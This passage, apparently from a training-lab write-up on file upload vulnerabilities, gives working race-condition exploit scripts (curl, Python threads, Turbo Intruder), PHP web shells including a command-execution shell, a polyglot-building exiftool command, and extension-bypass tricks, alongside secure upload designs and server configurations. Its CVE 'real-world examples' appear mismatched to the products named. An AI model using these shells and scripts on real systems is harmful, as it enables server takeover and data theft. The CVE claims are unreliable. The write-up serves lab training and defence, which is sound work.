UPLOAD_URL="$TARGET/upload"
ACCESS_URL="$TARGET/uploads/exploit.php"

# Upload and access simultaneously
(curl -X POST -F "file=@exploit.php" $UPLOAD_URL &)
for i in {1..20}; do
    curl -s $ACCESS_URL &
done
wait
```

#### Method 2: Python Script
```python
import requests
import threading

upload_url = "http://target.com/upload"
access_url = "http://target.com/uploads/exploit.php"

def upload():
    files = {'file': open('exploit.php', 'rb')}
    requests.post(upload_url, files=files)

def access():
    r = requests.get(access_url)
    if r.status_code == 200 and len(r.text) > 0:
        print("[+] Success!")
        print(r.text)

# Start upload
threading.Thread(target=upload).start()

# Immediately start 20 access attempts
for i in range(20):
    threading.Thread(target=access).start()
```

#### Method 3: Burp Repeater (Manual)
1. Open two Repeater tabs: one with POST upload, one with GET access
2. Arrange windows side-by-side
3. Click Send on POST, immediately click Send on GET repeatedly
4. Requires fast manual clicking, less reliable than Turbo Intruder

### Advanced Turbo Intruder Techniques

#### High-Volume Attack
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)

    upload_request = '''<POST-UPLOAD-REQUEST>'''
    access_request = '''<GET-ACCESS-REQUEST>'''

    # Send 100 requests
    for i in range(50):
        engine.queue(upload_request, gate='race1')
        engine.queue(access_request, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)
```

#### Multiple Upload Attempts
```python
# Upload multiple times to increase window
for i in range(3):
    engine.queue(upload_request, gate='race1')

# Access many times
for i in range(10):
    engine.queue(access_request, gate='race1')
```

### Why This Vulnerability Exists

**Flawed Process Flow**:
```
VULNERABLE DESIGN:
1. Accept upload
2. Save file to web-accessible directory
3. Perform security checks (slow)
4. Delete if malicious

SECURE DESIGN:
1. Accept upload
2. Save to temporary, non-accessible directory
3. Perform security checks
4. Only move to web directory if safe
```

**Time-of-Check-to-Time-of-Use (TOCTOU)**:
- **Check time**: When security scan runs
- **Use time**: When file is accessed via HTTP
- **Vulnerability**: State changes between check and use

### Real-World Examples

#### CVE-2020-10966: Jira Race Condition
Atlassian Jira file upload race condition allowed malicious file execution.

#### CVE-2019-11223: GitLab Race Condition
GitLab had a TOCTOU vulnerability in file upload validation.

#### CVE-2018-16341: WordPress Plugin Race
Multiple WordPress plugins vulnerable to race conditions in upload handling.

### Prevention Measures

#### Secure Upload Process
```php
// VULNERABLE
move_uploaded_file($tmp, 'uploads/' . $filename);  // Immediately accessible
if (contains_malware($filename)) {
    unlink('uploads/' . $filename);  // Race window exists here
}

// SECURE
// 1. Upload to non-web-accessible temp directory
$temp_path = '/var/tmp/uploads/' . $random_name;
move_uploaded_file($tmp, $temp_path);

// 2. Perform all validation
if (contains_malware($temp_path) || !is_valid_type($temp_path)) {
    unlink($temp_path);
    die('Invalid file');
}

// 3. Only move to web directory if safe
rename($temp_path, '/var/www/uploads/' . $safe_name);
```

#### Atomic Operations
```php
// Use file locking to prevent race conditions
$fp = fopen($filepath, 'w');
if (flock($fp, LOCK_EX)) {  // Exclusive lock
    fwrite($fp, $contents);
    flock($fp, LOCK_UN);  // Release lock
}
fclose($fp);
```

#### Validate Before Storage
```php
// Check in memory before writing to disk
$tmp_contents = file_get_contents($_FILES['file']['tmp_name']);

// Validate content
if (!is_valid($tmp_contents)) {
    die('Invalid file');
}

// Only write after validation
file_put_contents('uploads/' . $safe_name, $tmp_contents);
```

#### Non-Web-Accessible Storage
```
# Directory structure
/var/www/html/          # Web root - no uploads here
/var/data/uploads/      # Upload storage - NOT web-accessible
/var/tmp/uploads/       # Temporary validation area
```

Serve files through a proxy script that validates access:
```php
// download.php?file=abc123.jpg
$file_id = $_GET['file'];
$path = '/var/data/uploads/' . $file_id;

// Validate file, user permissions, etc.
if (is_authorized($user, $file_id)) {
    readfile($path);
}
```

#### Web Server Configuration

**Disable execution in upload directory**:
```apache
# Apache
<Directory /var/www/html/uploads>
    php_flag engine off
    Options -ExecCGI
</Directory>
```

```nginx
# Nginx
location /uploads/ {
    location ~ \.php$ {
        return 403;
    }
}
```

### Testing for Race Conditions

#### Indicators of Vulnerability
1. Upload succeeds even with malicious files
2. File briefly accessible then disappears
3. Error messages like "virus detected" appear after delay
4. File scan/validation runs asynchronously (not blocking)

#### Testing Checklist
- [ ] Upload malicious file, note response time
- [ ] Try accessing immediately after upload
- [ ] Use automated tools (Turbo Intruder) for rapid requests
- [ ] Vary timing - try different concurrent connection counts
- [ ] Monitor for successful code execution in rapid requests

---

## Summary: Complete Lab Overview

| # | Lab Name | Difficulty | Key Vulnerability | Bypass Technique |
|---|----------|------------|-------------------|------------------|
| 1 | Remote code execution via web shell upload | APPRENTICE | No validation | Direct upload |
| 2 | Web shell upload via Content-Type restriction bypass | APPRENTICE | Trusts Content-Type header | Modify MIME type |
| 3 | Web shell upload via path traversal | PRACTITIONER | Validates before decoding | URL-encode traversal |
| 4 | Web shell upload via extension blacklist bypass | PRACTITIONER | Blacklist, allows .htaccess | Upload .htaccess config |
| 5 | Web shell upload via obfuscated file extension | PRACTITIONER | Extension check only | Null byte injection |
| 6 | Remote code execution via polyglot web shell upload | PRACTITIONER | Content validation only | Polyglot file (image+PHP) |
| 7 | Web shell upload via race condition | PRACTITIONER | Async validation | Timing attack |

## Common Payloads Across All Labs

### Basic PHP Web Shell
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Command Execution Shell
```php
<?php system($_GET['cmd']); ?>
```

### Polyglot Creation
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
```

### .htaccess Configuration
```apache
AddType application/x-httpd-php .l33t
```

## Progressive Defense Bypasses

**Level 1 - No Defense**:
- Direct upload of exploit.php

**Level 2 - MIME Type Check**:
- Change Content-Type: image/jpeg

**Level 3 - Execution Disabled**:
- Path traversal: ..%2fexploit.php

**Level 4 - Extension Blacklist**:
- Upload .htaccess + custom extension

**Level 5 - Extension Validation**:
- Null byte: exploit.php%00.jpg

**Level 6 - Content Validation**:
- Polyglot file with ExifTool

**Level 7 - Async Validation**:
- Race condition with Turbo Intruder

## Essential Tools

1. **Burp Suite**: Intercept, modify, replay requests
2. **ExifTool**: Create polyglot files
3. **Turbo Intruder**: Race condition exploitation
4. **curl/wget**: Command-line file uploads
5. **Python/Bash**: Automation scripts

## Key Learning Outcomes

After completing all 7 labs, you will understand:
- Multiple file upload validation mechanisms
- Various bypass techniques for each defense
- How to chain vulnerabilities for complex bypasses
- Real-world exploitation scenarios
- Proper defense implementations
- Tools and techniques for security testing

## Practice Recommendations

1. Complete labs in order (difficulty progression)
2. Try alternative payloads and techniques
3. Understand WHY each bypass works
4. Implement defenses and test them
5. Automate exploitation with scripts
6. Apply techniques to CTFs and bug bounties
